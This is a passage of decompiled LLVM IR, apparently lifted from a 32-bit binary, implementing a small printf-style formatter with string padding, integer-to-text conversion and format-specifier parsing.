dec_label_pc_804838b:                             ; preds = %entry
  %v3_80483a1 = bitcast i8* %stack_var_8 to i32*
  %v4_80483a1 = call i32 @__libc_write(i32 1, i32* %v3_80483a1, i32 1)
  br label %dec_label_pc_80483a6

dec_label_pc_80483a6:                             ; preds = %dec_label_pc_8048372, %dec_label_pc_804838b
  %v0_80483a7 = phi i32 [ %tmp5, %dec_label_pc_8048372 ], [ %v4_80483a1, %dec_label_pc_804838b ]
  ret i32 %v0_80483a7

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_80483a6, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp13 = icmp slt i32 %arg3, 1
  br i1 %tmp13, label %dec_label_pc_8048409, label %dec_label_pc_80483c2

dec_label_pc_80483c2:                             ; preds = %entry
  %v4_80483c9 = ptrtoint i8* %arg2 to i32
  store i32 %v4_80483c9, i32* @edx, align 4
  %v2_80483da45 = load i8, i8* %arg2, align 1
  %v4_80483dd47 = icmp eq i8 %v2_80483da45, 0
  %v1_80483df49 = icmp eq i1 %v4_80483dd47, false
  br i1 %v1_80483df49, label %dec_label_pc_80483d1, label %dec_label_pc_80483e1

dec_label_pc_80483d1:                             ; preds = %dec_label_pc_80483c2, %dec_label_pc_80483d1
  %v4_80483d751 = phi i32 [ %v5_80483d4, %dec_label_pc_80483d1 ], [ %v4_80483c9, %dec_label_pc_80483c2 ]
  %stack_var_-12.050 = phi i32 [ %v4_80483d1, %dec_label_pc_80483d1 ], [ 0, %dec_label_pc_80483c2 ]
  %v4_80483d1 = add i32 %stack_var_-12.050, 1
  %v5_80483d4 = add i32 %v4_80483d751, 1
  %v22_80483d4 = inttoptr i32 %v5_80483d4 to i8*
  store i32 %v5_80483d4, i32* @edx, align 4
  %v2_80483da = load i8, i8* %v22_80483d4, align 1
  %v4_80483dd = icmp eq i8 %v2_80483da, 0
  %v1_80483df = icmp eq i1 %v4_80483dd, false
  br i1 %v1_80483df, label %dec_label_pc_80483d1, label %dec_label_pc_80483e1

dec_label_pc_80483e1:                             ; preds = %dec_label_pc_80483d1, %dec_label_pc_80483c2
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_80483c2 ], [ %v4_80483d1, %dec_label_pc_80483d1 ]
  %v5_80483e7 = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_80483e7, label %dec_label_pc_80483f2, label %dec_label_pc_80483f8

dec_label_pc_80483f2:                             ; preds = %dec_label_pc_80483e1
  store i32 %stack_var_-12.0.lcssa, i32* @edx, align 4
  %v5_80483f5 = sub i32 %arg3, %stack_var_-12.0.lcssa
  br label %dec_label_pc_80483f8

dec_label_pc_80483f8:                             ; preds = %dec_label_pc_80483e1, %dec_label_pc_80483f2
  %storemerge = phi i32 [ %v5_80483f5, %dec_label_pc_80483f2 ], [ 0, %dec_label_pc_80483e1 ]
  %v1_80483fb = and i32 %arg4, 2
  %tmp14 = mul nuw nsw i32 %v1_80483fb, 8
  %tmp15 = or i32 %tmp14, 32
  br label %dec_label_pc_8048409

dec_label_pc_8048409:                             ; preds = %dec_label_pc_80483f8, %entry
  %stack_var_12.0 = phi i32 [ %arg3, %entry ], [ %storemerge, %dec_label_pc_80483f8 ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ %tmp15, %dec_label_pc_80483f8 ]
  %v1_804840c = urem i32 %arg4, 2
  %v2_804840c = icmp eq i32 %v1_804840c, 0
  %v1_8048411 = icmp eq i1 %v2_804840c, false
  %.pre = inttoptr i32 %arg1 to i32*
  br i1 %v1_8048411, label %dec_label_pc_8048453.preheader, label %dec_label_pc_804842d.preheader

dec_label_pc_804842d.preheader:                   ; preds = %dec_label_pc_8048409
  %tmp1638 = icmp slt i32 %stack_var_12.0, 1
  %tmp1739 = icmp eq i1 %tmp1638, false
  br i1 %tmp1739, label %dec_label_pc_8048415, label %dec_label_pc_8048453.preheader

dec_label_pc_8048415:                             ; preds = %dec_label_pc_804842d.preheader, %dec_label_pc_8048415
  %stack_var_-20.041 = phi i32 [ %v4_8048427, %dec_label_pc_8048415 ], [ 0, %dec_label_pc_804842d.preheader ]
  %stack_var_12.140 = phi i32 [ %v4_804842a, %dec_label_pc_8048415 ], [ %stack_var_12.0, %dec_label_pc_804842d.preheader ]
  %v3_8048422 = call i32 @printchar(i32* %.pre, i32 %stack_var_-16.0)
  %v4_8048427 = add i32 %stack_var_-20.041, 1
  %v4_804842a = add i32 %stack_var_12.140, -1
  %tmp16 = icmp slt i32 %v4_804842a, 1
  %tmp17 = icmp eq i1 %tmp16, false
  br i1 %tmp17, label %dec_label_pc_8048415, label %dec_label_pc_8048453.preheader

dec_label_pc_8048453.preheader:                   ; preds = %dec_label_pc_804842d.preheader, %dec_label_pc_8048415, %dec_label_pc_8048409
  %stack_var_12.2.ph = phi i32 [ %stack_var_12.0, %dec_label_pc_8048409 ], [ %stack_var_12.0, %dec_label_pc_804842d.preheader ], [ %v4_804842a, %dec_label_pc_8048415 ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_8048409 ], [ 0, %dec_label_pc_804842d.preheader ], [ %v4_8048427, %dec_label_pc_8048415 ]
  %v4_804845326 = ptrtoint i8* %arg2 to i32
  %v2_804845627 = load i8, i8* %arg2, align 1
  %v4_804845929 = icmp eq i8 %v2_804845627, 0
  %v1_804845b31 = icmp eq i1 %v4_804845929, false
  br i1 %v1_804845b31, label %dec_label_pc_8048435, label %dec_label_pc_8048477.preheader

dec_label_pc_8048435:                             ; preds = %dec_label_pc_8048453.preheader, %dec_label_pc_8048435
  %v4_804845334 = phi i32 [ %v5_8048450, %dec_label_pc_8048435 ], [ %v4_804845326, %dec_label_pc_8048453.preheader ]
  %stack_var_-20.133 = phi i32 [ %v4_804844d, %dec_label_pc_8048435 ], [ %stack_var_-20.1.ph, %dec_label_pc_8048453.preheader ]
  %stack_var_8.032 = phi i8* [ %v22_8048450, %dec_label_pc_8048435 ], [ %arg2, %dec_label_pc_8048453.preheader ]
  %v2_8048438 = load i8, i8* %stack_var_8.032, align 1
  %v3_8048438 = zext i8 %v2_8048438 to i32
  %v3_8048448 = call i32 @printchar(i32* %.pre, i32 %v3_8048438)
  %v4_804844d = add i32 %stack_var_-20.133, 1
  %v5_8048450 = add i32 %v4_804845334, 1
  %v22_8048450 = inttoptr i32 %v5_8048450 to i8*
  %v2_8048456 = load i8, i8* %v22_8048450, align 1
  %v4_8048459 = icmp eq i8 %v2_8048456, 0
  %v1_804845b = icmp eq i1 %v4_8048459, false
  br i1 %v1_804845b, label %dec_label_pc_8048435, label %dec_label_pc_8048477.preheader

dec_label_pc_8048477.preheader:                   ; preds = %dec_label_pc_8048435, %dec_label_pc_8048453.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_8048453.preheader ], [ %v4_804844d, %dec_label_pc_8048435 ]
  %tmp1822 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp1923 = icmp eq i1 %tmp1822, false
  br i1 %tmp1923, label %dec_label_pc_804845f, label %dec_label_pc_804847d

dec_label_pc_804845f:                             ; preds = %dec_label_pc_8048477.preheader, %dec_label_pc_804845f
  %stack_var_-20.225 = phi i32 [ %v4_8048471, %dec_label_pc_804845f ], [ %stack_var_-20.1.lcssa, %dec_label_pc_8048477.preheader ]
  %stack_var_12.324 = phi i32 [ %v4_8048474, %dec_label_pc_804845f ], [ %stack_var_12.2.ph, %dec_label_pc_8048477.preheader ]
  %v3_804846c = call i32 @printchar(i32* %.pre, i32 %stack_var_-16.0)
  %v4_8048471 = add i32 %stack_var_-20.225, 1
  %v4_8048474 = add i32 %stack_var_12.324, -1
  %tmp18 = icmp slt i32 %v4_8048474, 1
  %tmp19 = icmp eq i1 %tmp18, false
  br i1 %tmp19, label %dec_label_pc_804845f, label %dec_label_pc_804847d

dec_label_pc_804847d:                             ; preds = %dec_label_pc_804845f, %dec_label_pc_8048477.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_8048477.preheader ], [ %v4_8048471, %dec_label_pc_804845f ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v4_8048474, { 1, 0 }
  uselistorder i8* %v22_8048450, { 1, 0 }
  uselistorder i32 %v5_8048450, { 1, 0 }
  uselistorder i32 %v4_804842a, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 2, 0 }
  uselistorder i32 %v5_80483d4, { 1, 2, 0 }
  uselistorder i32 %arg3, { 3, 1, 2, 0 }
  uselistorder i8* %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %dec_label_pc_804845f, { 1, 0 }
  uselistorder label %dec_label_pc_8048435, { 1, 0 }
  uselistorder label %dec_label_pc_8048453.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048415, { 1, 0 }
  uselistorder label %dec_label_pc_80483f8, { 1, 0 }
  uselistorder label %dec_label_pc_80483d1, { 1, 0 }
}

define i32 @printi(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v4_8048496 = trunc i64 %arg2 to i32
  %v5_804849c = icmp eq i32 %v4_8048496, 0
  %v6_804849c = icmp slt i32 %v4_8048496, 0
  %v1_80484a0 = icmp eq i1 %v5_804849c, false
  br i1 %v1_80484a0, label %dec_label_pc_80484d2, label %dec_label_pc_80484a2

dec_label_pc_80484a2:                             ; preds = %entry
  store i32 48, i32* %stack_var_-16, align 4
  %tmp42 = bitcast i32* %stack_var_-16 to i8*
  %v6_80484c5 = call i32 @prints(i32 %arg1, i8* %tmp42, i32 %arg5, i32 %arg6)
  br label %dec_label_pc_80485bc

dec_label_pc_80484d2:                             ; preds = %entry
  %v4_80484d2 = icmp eq i32 %arg4, 0
  br i1 %v4_80484d2, label %dec_label_pc_80484f3, label %dec_label_pc_80484d8

dec_label_pc_80484d8:                             ; preds = %dec_label_pc_80484d2
  %v13_80484d8 = icmp eq i32 %arg3, 10
  %v1_80484dc = icmp eq i1 %v13_80484d8, false
  br i1 %v1_80484dc, label %dec_label_pc_80484f3, label %dec_label_pc_80484de

dec_label_pc_80484de:                             ; preds = %dec_label_pc_80484d8
  %v1_80484e2 = icmp eq i1 %v6_804849c, false
  br i1 %v1_80484e2, label %dec_label_pc_80484f3, label %dec_label_pc_80484e4

dec_label_pc_80484e4:                             ; preds = %dec_label_pc_80484de
  %v1_80484ee = sub i32 0, %v4_8048496
  %v5_80484f0 = sext i32 %v1_80484ee to i64
  br label %dec_label_pc_80484f3

dec_label_pc_80484f3:                             ; preds = %dec_label_pc_80484de, %dec_label_pc_80484d8, %dec_label_pc_80484d2, %dec_label_pc_80484e4
  %stack_var_-24.0 = phi i64 [ %arg2, %dec_label_pc_80484d2 ], [ %arg2, %dec_label_pc_80484d8 ], [ %arg2, %dec_label_pc_80484de ], [ %v5_80484f0, %dec_label_pc_80484e4 ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_80484d2 ], [ 0, %dec_label_pc_80484d8 ], [ 0, %dec_label_pc_80484de ], [ 1, %dec_label_pc_80484e4 ]
  %tmp43 = bitcast i32* %stack_var_-5 to i8*
  store i8 0, i8* %tmp43, align 4
  %v4_80485548 = trunc i64 %stack_var_-24.0 to i32
  %v5_80485549 = icmp eq i32 %v4_80485548, 0
  %v1_804855816 = icmp eq i1 %v5_80485549, false
  br i1 %v1_804855816, label %dec_label_pc_8048504.lr.ph, label %dec_label_pc_804855a

dec_label_pc_8048504.lr.ph:                       ; preds = %dec_label_pc_80484f3
  %v5_8048507 = sext i32 %arg3 to i64
  br label %dec_label_pc_8048504

dec_label_pc_8048504:                             ; preds = %dec_label_pc_8048504.lr.ph, %dec_label_pc_804852c
  %stack_var_-24.118 = phi i64 [ %stack_var_-24.0, %dec_label_pc_8048504.lr.ph ], [ %v5_8048551, %dec_label_pc_804852c ]
  %stack_var_-40.017 = phi i8* [ %tmp43, %dec_label_pc_8048504.lr.ph ], [ %v22_804852c, %dec_label_pc_804852c ]
  %v6_8048512 = and i64 %stack_var_-24.118, 4294967295
  %v12_8048512 = udiv i64 %v6_8048512, %v5_8048507
  %v13_8048512 = trunc i64 %v12_8048512 to i32
  %v14_8048512 = urem i64 %v6_8048512, %v5_8048507
  %v5_8048517 = trunc i64 %v14_8048512 to i8
  %v7_804851e = icmp sgt i8 %v5_8048517, 9
  br i1 %v7_804851e, label %dec_label_pc_8048520, label %dec_label_pc_804852c

dec_label_pc_8048520:                             ; preds = %dec_label_pc_8048504
  %tmp = trunc i64 %v14_8048512 to i32
  %v5_8048523 = add i32 %tmp, %arg7
  %v1_8048526 = add i32 %v5_8048523, 198
  %v11_8048526 = trunc i32 %v1_8048526 to i8
  br label %dec_label_pc_804852c

dec_label_pc_804852c:                             ; preds = %dec_label_pc_8048504, %dec_label_pc_8048520
  %stack_var_-36.0 = phi i8 [ %v11_8048526, %dec_label_pc_8048520 ], [ %v5_8048517, %dec_label_pc_8048504 ]
  %v4_804852c = ptrtoint i8* %stack_var_-40.017 to i32
  %v5_804852c = add i32 %v4_804852c, -1
  %v22_804852c = inttoptr i32 %v5_804852c to i8*
  %v2_8048533 = add i8 %stack_var_-36.0, 48
  store i8 %v2_8048533, i8* %v22_804852c, align 1
  %v5_8048551 = sext i32 %v13_8048512 to i64
  %v5_8048554 = icmp eq i32 %v13_8048512, 0
  %v1_8048558 = icmp eq i1 %v5_8048554, false
  br i1 %v1_8048558, label %dec_label_pc_8048504, label %dec_label_pc_804855a

dec_label_pc_804855a:                             ; preds = %dec_label_pc_804852c, %dec_label_pc_80484f3
  %stack_var_-40.0.lcssa = phi i8* [ %tmp43, %dec_label_pc_80484f3 ], [ %v22_804852c, %dec_label_pc_804852c ]
  %v4_804855a = icmp eq i32 %stack_var_-32.0, 0
  br i1 %v4_804855a, label %dec_label_pc_8048594, label %dec_label_pc_8048560

dec_label_pc_8048560:                             ; preds = %dec_label_pc_804855a
  %v4_8048560 = icmp eq i32 %arg5, 0
  br i1 %v4_8048560, label %dec_label_pc_804858b, label %dec_label_pc_8048566

dec_label_pc_8048566:                             ; preds = %dec_label_pc_8048560
  %v1_8048569 = and i32 %arg6, 2
  %v2_8048569 = icmp eq i32 %v1_8048569, 0
  br i1 %v2_8048569, label %dec_label_pc_804858b, label %dec_label_pc_8048570

dec_label_pc_8048570:                             ; preds = %dec_label_pc_8048566
  %v3_804857e = inttoptr i32 %arg1 to i32*
  %v4_804857e = call i32 @printchar(i32* %v3_804857e, i32 45)
  %v4_8048586 = add i32 %arg5, -1
  br label %dec_label_pc_8048594

dec_label_pc_804858b:                             ; preds = %dec_label_pc_8048566, %dec_label_pc_8048560
  %v4_804858b = ptrtoint i8* %stack_var_-40.0.lcssa to i32
  %v5_804858b = add i32 %v4_804858b, -1
  %v22_804858b = inttoptr i32 %v5_804858b to i8*
  store i8 45, i8* %v22_804858b, align 1
  br label %dec_label_pc_8048594

dec_label_pc_8048594:                             ; preds = %dec_label_pc_804855a, %dec_label_pc_8048570, %dec_label_pc_804858b
  %stack_var_20.0 = phi i32 [ %arg5, %dec_label_pc_804855a ], [ %arg5, %dec_label_pc_804858b ], [ %v4_8048586, %dec_label_pc_8048570 ]
  %stack_var_-40.1 = phi i8* [ %stack_var_-40.0.lcssa, %dec_label_pc_804855a ], [ %v22_804858b, %dec_label_pc_804858b ], [ %stack_var_-40.0.lcssa, %dec_label_pc_8048570 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_804855a ], [ 0, %dec_label_pc_804858b ], [ 1, %dec_label_pc_8048570 ]
  %v6_80485af = call i32 @prints(i32 %arg1, i8* %stack_var_-40.1, i32 %stack_var_20.0, i32 %arg6)
  %v2_80485b7 = add i32 %v6_80485af, %stack_var_-28.0
  store i32 %v2_80485b7, i32* @edx, align 4
  br label %dec_label_pc_80485bc

dec_label_pc_80485bc:                             ; preds = %dec_label_pc_80484a2, %dec_label_pc_8048594
  %storemerge = phi i32 [ %v2_80485b7, %dec_label_pc_8048594 ], [ %v6_80484c5, %dec_label_pc_80484a2 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-40.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v22_804852c, { 0, 2, 1 }
  uselistorder i8 %v5_8048517, { 1, 0 }
  uselistorder i64 %v6_8048512, { 1, 0 }
  uselistorder i32 %arg6, { 1, 2, 0 }
  uselistorder i32 %arg5, { 2, 4, 1, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i64 %arg2, { 2, 1, 0, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80485bc, { 1, 0 }
  uselistorder label %dec_label_pc_8048594, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804852c, { 1, 0 }
  uselistorder label %dec_label_pc_8048504, { 1, 0 }
  uselistorder label %dec_label_pc_80484f3, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp6 = ptrtoint i32* %arg1 to i32
  %stack_var_-6 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80485c1 = load i32, i32* @ebp, align 4
  store i32 %v0_80485c1, i32* %stack_var_-4, align 4
  %tmp21 = bitcast i32* %stack_var_-6 to i8*
  %stack_var_8.435 = inttoptr i32 %arg2 to i8*
  %v2_804887536 = load i8, i8* %stack_var_8.435, align 1
  %v4_804887838 = icmp eq i8 %v2_804887536, 0
  %v1_804887a40 = icmp eq i1 %v4_804887838, false
  br i1 %v1_804887a40, label %dec_label_pc_80485d3, label %dec_label_pc_8048880

dec_label_pc_80485d3:                             ; preds = %entry, %dec_label_pc_804886f
  %stack_var_8.444 = phi i8* [ %stack_var_8.4, %dec_label_pc_804886f ], [ %stack_var_8.435, %entry ]
  %stack_var_-28.143 = phi i32 [ %stack_var_-28.0, %dec_label_pc_804886f ], [ 0, %entry ]
  %stack_var_12.142 = phi i32 [ %stack_var_12.0, %dec_label_pc_804886f ], [ %arg3, %entry ]
  %stack_var_8.4.in41 = phi i32 [ %v5_804886f, %dec_label_pc_804886f ], [ %arg2, %entry ]
  %v2_80485d6 = load i8, i8* %stack_var_8.444, align 1
  %v10_80485d9 = icmp eq i8 %v2_80485d6, 37
  %v1_80485db = icmp eq i1 %v10_80485d9, false
  br i1 %v1_80485db, label %dec_label_pc_8048854, label %dec_label_pc_80485e1

dec_label_pc_80485e1:                             ; preds = %dec_label_pc_80485d3
  %v5_80485e1 = add i32 %stack_var_8.4.in41, 1
  %v22_80485e1 = inttoptr i32 %v5_80485e1 to i8*
  %v2_80485f4 = load i8, i8* %v22_80485e1, align 1
  %v4_80485f7 = icmp eq i8 %v2_80485f4, 0
  br i1 %v4_80485f7, label %dec_label_pc_8048880, label %dec_label_pc_80485ff

dec_label_pc_80485ff:                             ; preds = %dec_label_pc_80485e1
  %v2_8048602 = load i8, i8* %v22_80485e1, align 1
  %v10_8048605 = icmp eq i8 %v2_8048602, 37
  br i1 %v10_8048605, label %dec_label_pc_8048854, label %dec_label_pc_804860d

dec_label_pc_804860d:                             ; preds = %dec_label_pc_80485ff
  %v2_8048610 = load i8, i8* %v22_80485e1, align 1
  %v10_8048613 = icmp eq i8 %v2_8048610, 45
  %v1_8048615 = icmp eq i1 %v10_8048613, false
  br i1 %v1_8048615, label %dec_label_pc_804862a.preheader, label %dec_label_pc_8048617

dec_label_pc_8048617:                             ; preds = %dec_label_pc_804860d
  %v5_8048617 = add i32 %stack_var_8.4.in41, 2
  %v22_8048617 = inttoptr i32 %v5_8048617 to i8*
  br label %dec_label_pc_804862a.preheader

dec_label_pc_804862a.preheader:                   ; preds = %dec_label_pc_8048617, %dec_label_pc_804860d
  %stack_var_8.0.ph = phi i8* [ %v22_80485e1, %dec_label_pc_804860d ], [ %v22_8048617, %dec_label_pc_8048617 ]
  %stack_var_-32.0.ph = phi i32 [ 0, %dec_label_pc_804860d ], [ 1, %dec_label_pc_8048617 ]
  %v4_804862a22 = ptrtoint i8* %stack_var_8.0.ph to i32
  %v2_804862d23 = load i8, i8* %stack_var_8.0.ph, align 1
  %v7_804863030 = icmp eq i8 %v2_804862d23, 48
  br i1 %v7_804863030, label %dec_label_pc_8048623, label %dec_label_pc_8048659.preheader

dec_label_pc_8048623:                             ; preds = %dec_label_pc_804862a.preheader, %dec_label_pc_8048623
  %v4_804862a33 = phi i32 [ %v5_8048623, %dec_label_pc_8048623 ], [ %v4_804862a22, %dec_label_pc_804862a.preheader ]
  %stack_var_-32.032 = phi i32 [ %v4_8048626, %dec_label_pc_8048623 ], [ %stack_var_-32.0.ph, %dec_label_pc_804862a.preheader ]
  %v5_8048623 = add i32 %v4_804862a33, 1
  %v22_8048623 = inttoptr i32 %v5_8048623 to i8*
  %v4_8048626 = or i32 %stack_var_-32.032, 2
  %v2_804862d = load i8, i8* %v22_8048623, align 1
  %v7_8048630 = icmp eq i8 %v2_804862d, 48
  br i1 %v7_8048630, label %dec_label_pc_8048623, label %dec_label_pc_8048659.preheader

dec_label_pc_8048659.preheader:                   ; preds = %dec_label_pc_8048623, %dec_label_pc_804862a.preheader
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_804862a.preheader ], [ %v22_8048623, %dec_label_pc_8048623 ]
  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_804862a.preheader ], [ %v4_8048626, %dec_label_pc_8048623 ]
  br label %dec_label_pc_8048659

dec_label_pc_8048636:                             ; preds = %dec_label_pc_8048663
  %v2_804863f = mul i32 %stack_var_-36.0, 10
  %v2_8048647 = load i8, i8* %stack_var_8.1, align 1
  %v3_8048647 = zext i8 %v2_8048647 to i32
  %v5_804864d = add i32 %v3_8048647, %v2_804863f
  %v1_8048650 = add i32 %v5_804864d, -48
  %v5_8048656 = add i32 %v4_8048659, 1
  %v22_8048656 = inttoptr i32 %v5_8048656 to i8*
  br label %dec_label_pc_8048659

dec_label_pc_8048659:                             ; preds = %dec_label_pc_8048659.preheader, %dec_label_pc_8048636
  %stack_var_8.1 = phi i8* [ %v22_8048656, %dec_label_pc_8048636 ], [ %stack_var_8.0.lcssa, %dec_label_pc_8048659.preheader ]
  %stack_var_-36.0 = phi i32 [ %v1_8048650, %dec_label_pc_8048636 ], [ 0, %dec_label_pc_8048659.preheader ]
  %v4_8048659 = ptrtoint i8* %stack_var_8.1 to i32
  %v2_804865c = load i8, i8* %stack_var_8.1, align 1
  %tmp = icmp ult i8 %v2_804865c, 48
  br i1 %tmp, label %dec_label_pc_804866d, label %dec_label_pc_8048663

dec_label_pc_8048663:                             ; preds = %dec_label_pc_8048659
  %v2_8048666 = load i8, i8* %stack_var_8.1, align 1
  %tmp48 = icmp ult i8 %v2_8048666, 58
  br i1 %tmp48, label %dec_label_pc_8048636, label %dec_label_pc_804866d

dec_label_pc_804866d:                             ; preds = %dec_label_pc_8048663, %dec_label_pc_8048659
  %v2_8048670 = load i8, i8* %stack_var_8.1, align 1
  %v10_8048673 = icmp eq i8 %v2_8048670, 115
  %v1_8048675 = icmp eq i1 %v10_8048673, false
  br i1 %v1_8048675, label %dec_label_pc_80486c4, label %dec_label_pc_8048677

dec_label_pc_8048677:                             ; preds = %dec_label_pc_804866d
  %v1_804867a = add i32 %stack_var_12.142, 4
  %v1_8048682 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_8048682 = load i32, i32* %v1_8048682, align 4
  %v4_8048687 = icmp eq i32 %v2_8048682, 0
  br i1 %v4_8048687, label %dec_label_pc_804869c, label %dec_label_pc_804868d

dec_label_pc_804868d:                             ; preds = %dec_label_pc_8048677
  %v5_8048690 = inttoptr i32 %v2_8048682 to i8*
  br label %dec_label_pc_804869c

dec_label_pc_804869c:                             ; preds = %dec_label_pc_8048677, %dec_label_pc_804868d
  %storemerge = phi i8* [ %v5_8048690, %dec_label_pc_804868d ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057520.12, i32 0, i32 0), %dec_label_pc_8048677 ]
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v6_80486b7 = call i32 @prints(i32 %tmp6, i8* %storemerge, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa)
  %v5_80486bc = add i32 %v6_80486b7, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_80486c4:                             ; preds = %dec_label_pc_804866d
  %v2_80486c7 = load i8, i8* %stack_var_8.1, align 1
  %v10_80486ca = icmp eq i8 %v2_80486c7, 100
  %v1_80486cc = icmp eq i1 %v10_80486ca, false
  br i1 %v1_80486cc, label %dec_label_pc_8048718, label %dec_label_pc_80486ce

dec_label_pc_80486ce:                             ; preds = %dec_label_pc_80486c4
  %v1_80486d1 = add i32 %stack_var_12.142, 4
  %v1_80486d9 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_80486d9 = load i32, i32* %v1_80486d9, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_804870b = sext i32 %v2_80486d9 to i64
  %v9_804870b = call i32 @printi(i32 %tmp6, i64 %v8_804870b, i32 10, i32 1, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_8048710 = add i32 %v9_804870b, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_8048718:                             ; preds = %dec_label_pc_80486c4
  %v2_804871b = load i8, i8* %stack_var_8.1, align 1
  %v10_804871e = icmp eq i8 %v2_804871b, 120
  %v1_8048720 = icmp eq i1 %v10_804871e, false
  br i1 %v1_8048720, label %dec_label_pc_804876c, label %dec_label_pc_8048722

dec_label_pc_8048722:                             ; preds = %dec_label_pc_8048718
  %v1_8048725 = add i32 %stack_var_12.142, 4
  %v1_804872d = inttoptr i32 %stack_var_12.142 to i32*
  %v2_804872d = load i32, i32* %v1_804872d, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_804875f = sext i32 %v2_804872d to i64
  %v9_804875f = call i32 @printi(i32 %tmp6, i64 %v8_804875f, i32 16, i32 0, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_8048764 = add i32 %v9_804875f, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_804876c:                             ; preds = %dec_label_pc_8048718
  %v2_804876f = load i8, i8* %stack_var_8.1, align 1
  %v10_8048772 = icmp eq i8 %v2_804876f, 88
  %v1_8048774 = icmp eq i1 %v10_8048772, false
  br i1 %v1_8048774, label %dec_label_pc_80487c0, label %dec_label_pc_8048776

dec_label_pc_8048776:                             ; preds = %dec_label_pc_804876c
  %v1_8048779 = add i32 %stack_var_12.142, 4
  %v1_8048781 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_8048781 = load i32, i32* %v1_8048781, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_80487b3 = sext i32 %v2_8048781 to i64
  %v9_80487b3 = call i32 @printi(i32 %tmp6, i64 %v8_80487b3, i32 16, i32 0, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 65)
  %v5_80487b8 = add i32 %v9_80487b3, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_80487c0:                             ; preds = %dec_label_pc_804876c
  %v2_80487c3 = load i8, i8* %stack_var_8.1, align 1
  %v10_80487c6 = icmp eq i8 %v2_80487c3, 117
  %v1_80487c8 = icmp eq i1 %v10_80487c6, false
  br i1 %v1_80487c8, label %dec_label_pc_8048811, label %dec_label_pc_80487ca

dec_label_pc_80487ca:                             ; preds = %dec_label_pc_80487c0
  %v1_80487cd = add i32 %stack_var_12.142, 4
  %v1_80487d5 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_80487d5 = load i32, i32* %v1_80487d5, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_8048807 = sext i32 %v2_80487d5 to i64
  %v9_8048807 = call i32 @printi(i32 %tmp6, i64 %v8_8048807, i32 10, i32 0, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_804880c = add i32 %v9_8048807, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_8048811:                             ; preds = %dec_label_pc_80487c0
  %v2_8048814 = load i8, i8* %stack_var_8.1, align 1
  %v10_8048817 = icmp eq i8 %v2_8048814, 99
  %v1_8048819 = icmp eq i1 %v10_8048817, false
  br i1 %v1_8048819, label %dec_label_pc_804886f, label %dec_label_pc_804881b

dec_label_pc_804881b:                             ; preds = %dec_label_pc_8048811
  %v1_804881e = add i32 %stack_var_12.142, 4
  %v1_8048826 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_8048826 = load i32, i32* %v1_8048826, align 4
  store i32 %v2_8048826, i32* %stack_var_-6, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v6_804884a = call i32 @prints(i32 %tmp6, i8* %tmp21, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa)
  %v5_804884f = add i32 %v6_804884a, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_8048854:                             ; preds = %dec_label_pc_80485ff, %dec_label_pc_80485d3
  %stack_var_8.2 = phi i8* [ %stack_var_8.444, %dec_label_pc_80485d3 ], [ %v22_80485e1, %dec_label_pc_80485ff ]
  %v2_8048857 = load i8, i8* %stack_var_8.2, align 1
